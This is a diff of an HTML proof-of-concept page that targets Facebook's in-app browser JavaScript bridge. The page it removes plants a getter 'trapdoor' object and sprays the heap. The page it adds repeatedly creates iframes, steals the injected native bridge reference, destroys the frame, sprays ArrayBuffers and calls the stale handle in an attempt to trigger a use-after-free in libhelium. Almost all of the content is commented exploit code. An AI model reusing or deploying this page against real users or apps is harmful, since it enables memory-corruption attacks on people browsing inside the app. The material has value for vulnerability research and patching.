@@ -2,64 +2,55 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>V8 Trapdoor Fuzzer</title>
+    <title>JSI Dangling Pointer</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace;">
-    <h3>Setting V8 JNI Trapdoors...</h3>
-    <div id="log">Waiting for FB injection...<br></div>
+<body style="background:#000; color:#f00; font-family:monospace;">
+    <h3>Extracting and Firing Dangling Pointers...</h3>
+    <div id="container"></div>
 
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerHTML += msg + "<br>"; }
-
-        // 1. Create the malicious object
-        let maliciousHandler = {};
-
-        // 2. Set the Trapdoor
-        // We override the 'invoke' property with a synchronous Getter
-        Object.defineProperty(maliciousHandler, 'invoke', {
-            get: function() {
-                log("<span style='color:red;'>🚨 TRAPDOOR TRIGGERED! C++ IS PAUSED! 🚨</span>");
+        const container = document.getElementById('container');
+        const uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
+        
+        function fireUAF() {
+            // 1. Spawn an isolated IFrame
+            let f = document.createElement('iframe');
+            container.appendChild(f);
+            
+            // 2. Give Facebook's Java layer 400ms to inject the bridge into the new IFrame
+            setTimeout(() => {
+                let iwin = f.contentWindow;
                 
-                // 3. The Annihilation
-                // While C++ is paused waiting for this getter to return, we 
-                // nuke the entire document layout and spam the heap to overwrite 
-                // the memory C++ is currently pointing to.
-                document.documentElement.innerHTML = "";
-                let trash = new Array(10000).fill("A".repeat(5000));
-                
-                // 4. Return a dummy function so C++ attempts to jump to it
-                return function() { return "pwned"; };
-            }
-        });
-
-        // 5. Plant the object in the global scope where FB expects it
-        window._AutofillCallbackHandler = maliciousHandler;
-
-        let uuid = "90dd8846-f47b-4312-8307-3681dc5bec88";
-        let initPayload = JSON.stringify({
-            "message": {
-                "name": "_AutofillCallbackHandler",
-                "callbackID": "f876739fb"
-            }
-        });
-
-        function fire() {
-            if (window.__call_iabjs_unified_bridge) {
-                log("[*] Bridge active. Sending Trapdoor coordinates...");
-                try {
-                    // Tell libhelium to register our trapdoor
-                    window.__call_iabjs_unified_bridge("initializeCallbackHandler", uuid, initPayload);
+                if (iwin && iwin.__call_iabjs_unified_bridge) {
+                    // 3. Steal the native bridge reference before destruction
+                    let stolenBridge = iwin.__call_iabjs_unified_bridge;
                     
-                    // Force a dummy event to make libhelium trigger the callback
-                    window.__call_iabjs_unified_bridge("BrowserDeclutterJS", uuid, '{"event":"init"}');
-                } catch(e) {}
-            }
+                    // 4. Destroy the IFrame!
+                    // This forces Chromium to delete the C++ RenderFrameHost.
+                    f.remove();
+                    
+                    // 5. Thrash the memory heap.
+                    // We allocate garbage to overwrite the exact memory space where 
+                    // the C++ bridge object used to live.
+                    let spray = [];
+                    for(let i = 0; i < 5000; i++) spray.push(new ArrayBuffer(1024));
+                    
+                    // 6. The Execution (Use-After-Free)
+                    // We call the stolen reference. If libhelium.so didn't invalidate
+                    // this handle during the IFrame teardown, it jumps into our sprayed memory.
+                    try {
+                        stolenBridge("page_language", uuid, '{"message":{}}');
+                    } catch(e) {}
+                    
+                } else {
+                    // Clean up if it wasn't injected yet
+                    f.remove();
+                }
+            }, 400); 
         }
 
-        // Keep attempting to register until Facebook injects the bridge
-        setInterval(fire, 500);
-
+        // Loop the attack to ensure we hit the exact garbage collection window
+        setInterval(fireUAF, 600);
     </script>
 </body>
 </html>
